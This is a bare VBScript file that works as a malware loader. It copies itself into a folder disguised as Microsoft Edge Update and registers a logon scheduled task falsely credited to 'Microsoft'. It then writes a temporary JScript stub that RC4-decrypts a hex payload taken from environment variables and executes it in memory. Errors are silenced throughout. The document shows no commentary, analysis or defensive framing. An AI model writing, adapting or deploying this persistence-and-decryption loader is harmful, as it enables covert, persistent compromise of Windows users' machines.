Option Explicit
On Error Resume Next

Dim oSh:Set oSh=CreateObject("WScript.Shell")
Dim oFso:Set oFso=CreateObject("Scripting.FileSystemObject")

Dim sLocal:sLocal=oSh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
Dim sPersistDir:sPersistDir=sLocal&"\Microsoft\EdgeUpdate"
Dim sPersistFile:sPersistFile=sPersistDir&"\edgeup.vbs"

If Not oFso.FolderExists(sPersistDir) Then oFso.CreateFolder sPersistDir

Dim sSelf:sSelf=WScript.ScriptFullName
If LCase(sSelf)<>LCase(sPersistFile) Then
    oFso.CopyFile sSelf,sPersistFile,True
End If

Dim sUser:sUser=oSh.ExpandEnvironmentStrings("%USERDOMAIN%\%USERNAME%")
Dim oTS:Set oTS=CreateObject("Schedule.Service")
oTS.Connect
Dim oRoot:Set oRoot=oTS.GetFolder("\")
Dim oTask:Set oTask=oTS.NewTask(0)
oTask.RegistrationInfo.Description="Edge update check"
oTask.RegistrationInfo.Author="Microsoft"
oTask.Settings.Enabled=True
oTask.Settings.DisallowStartIfOnBatteries=False
oTask.Settings.StopIfGoingOnBatteries=False
oTask.Settings.StartWhenAvailable=True
oTask.Settings.MultipleInstances=2
oTask.Principal.UserId=sUser
oTask.Principal.LogonType=3
oTask.Principal.RunLevel=0
Dim oTriggers:Set oTriggers=oTask.Triggers
Dim oTrigger:Set oTrigger=oTriggers.Create(9)
oTrigger.UserId=sUser
oTrigger.Enabled=True
Dim oActions:Set oActions=oTask.Actions
Dim oAction:Set oAction=oActions.Create(0)
oAction.Path="wscript.exe"
oAction.Arguments="//B //Nologo "&Chr(34)&sPersistFile&Chr(34)
oRoot.RegisterTaskDefinition "EdgeUpdateCheck",oTask,6,Empty,Empty,3
Set oTS=Nothing

Randomize
Dim sDir:sDir=oFso.GetSpecialFolder(2)
Dim sStub:sStub=sDir&"\edge"&Int(Rnd()*99999)&".js"
Dim oFile:Set oFile=oFso.CreateTextFile(sStub,True)
oFile.WriteLine "var o=new ActiveXObject(""WScript.Shell"");"
oFile.WriteLine "var e=o.Environment(""PROCESS"");"
oFile.WriteLine "var k=e(""PK"");"
oFile.WriteLine "var h=e(""P0"");"
oFile.WriteLine "var S=[];for(var i=0;i<256;i++)S[i]=i;"
oFile.WriteLine "var kl=k.length/2;var bk=[];"
oFile.WriteLine "for(i=0;i<kl;i++)bk[i]=parseInt(k.substr(i*2,2),16);"
oFile.WriteLine "var j=0,t;"
oFile.WriteLine "for(i=0;i<256;i++){j=(j+S[i]+bk[i%kl])&255;t=S[i];S[i]=S[j];S[j]=t;}"
oFile.WriteLine "var dl=h.length/2;var bd=[];"
oFile.WriteLine "for(i=0;i<dl;i++)bd[i]=parseInt(h.substr(i*2,2),16);"
oFile.WriteLine "var ii=0,jj=0,r="""";"
oFile.WriteLine "for(i=0;i<dl;i++){ii=(ii+1)&255;jj=(jj+S[ii])&255;t=S[ii];S[ii]=S[jj];S[jj]=t;r+=String.fromCharCode(bd[i]^S[(S[ii]+S[jj])&255]);}"
oFile.WriteLine "new Function(r)();"
oFile.Close

